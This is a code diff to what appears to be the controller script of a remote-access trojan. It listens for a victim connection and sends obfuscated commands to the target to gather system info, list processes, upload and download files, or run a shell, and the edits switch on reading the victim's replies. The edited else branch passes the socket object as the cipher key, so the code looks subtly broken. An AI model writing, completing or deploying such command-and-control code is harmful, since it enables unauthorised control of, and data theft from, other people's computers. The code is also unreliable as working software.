@@ -55,7 +55,7 @@ def main():
     print("Listening for connection")
     conn, addr = s.accept()
 
-    s = 4
+    ci = 4
 
     while(True):
         command = input("476-1337 >>> ")
@@ -67,7 +67,7 @@ def main():
             print('''Here are the available commands: \ninfo: Get general information about the target \nlp: List all running process \nupload <source> <destination>: source is u, destination is where you wanna save it \ndownload <filename>: filename should be the absolute path''')
         elif command == "info":
             print("Getting info from target")
-            result = encrypt(command, s)
+            result = encrypt(command, ci)
             print(result)
             conn.send(result.encode())
         # elif command == "upload":
@@ -83,7 +83,7 @@ def main():
         #     print("Downloading file to current directory")
         elif command == "lp":
             print("Listing process....")
-            result = encrypt(command, s)
+            result = encrypt(command, ci)
             print(result)
             conn.send(result.encode())
         elif command == "shell":
@@ -93,10 +93,11 @@ def main():
             print(result)
             # conn.send(result.encode())
         else:
-            print("Command not found!!!")
+            result = encrypt(command, s)
+            print(result)
 
-        # reply = conn.recv(4096)
-        # print("Result:\n " + reply)
+        reply = conn.recv(4096)
+        print("Result:\n " + reply)
 
 
 if __name__ == "__main__":
